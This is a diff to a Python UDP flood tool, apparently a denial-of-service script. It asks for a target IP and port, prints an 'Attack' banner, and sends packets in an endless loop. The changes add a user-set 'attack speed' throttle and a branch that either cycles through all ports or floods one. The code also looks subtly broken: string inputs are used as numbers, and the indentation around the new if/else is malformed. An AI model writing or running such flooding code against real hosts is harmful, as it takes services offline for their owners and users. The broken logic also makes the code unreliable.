@@ -36,7 +36,8 @@ print(ip)
 print()
 ip = input("\033[94m IP Target \033[1;31;40m  ==> : \033[0m")
 port = input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m")
-
+speed = input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[94m╠══>\033[0m ")
+print("\033[94m")
 os.system("clear")
 os.system("figlet Attack")
 print( "[                    ] 0% ")
@@ -55,10 +56,19 @@ print( "[====================] 100%")
 time.sleep(3)
 os.system("clear")
 sent = 0
+if port == 00000:
+     port = 1     
      while True:
           sock.sendto(bytes, (ip,port))
           sent = sent + 1
           port = port + 1
           print ("Sent %s packet %s port %d"%(sent,ip,port))
-          if port == 65534:
-            port = 1
+          time.sleep((1000-speed)/2000)
+          if port == 65535:
+               port = 1
+else:
+     while True:
+          sock.sendto(bytes, (ip,port))
+          sent = sent + 1
+          print ("Sent %s packet %s port %d"%(sent,ip,port))
+          time.sleep((1000-speed)/2000)
